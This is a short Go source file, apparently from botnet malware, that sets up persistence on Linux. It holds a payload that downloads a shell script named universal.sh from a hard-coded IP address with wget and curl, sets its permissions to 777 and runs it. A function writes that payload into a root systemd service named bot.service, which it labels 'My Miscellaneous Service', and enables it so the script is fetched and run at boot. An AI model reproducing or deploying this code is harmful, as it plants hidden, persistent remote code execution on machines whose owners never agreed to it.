package persistence

import (
	"fmt"
	"os"
	"os/exec"
)

const payload = `/bin/bash -c "/bin/wget "http://185.246.221.220/universal.sh"; chmod 777 universal.sh; ./universal.sh; /bin/curl -k -L --output universal.sh "http://185.246.221.220/universal.sh"; chmod 777 universal.sh; ./universal.sh"`

func SystemdPersistence() {
	skeleton := `
[Unit]
Description=My Miscellaneous Service
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/tmp
ExecStart=%s
Restart=no

[Install]
WantedBy=multi-user.target
				`
	daemon := fmt.Sprintf(skeleton, payload)
	os.WriteFile("/lib/systemd/system/bot.service", []byte(daemon), 0666)
	cmd := exec.Command("/bin/systemctl", "enable", "bot")
	out, err := cmd.Output()
	if err != nil {
		println(err.Error())
		return
	}
	println(string(out))
}
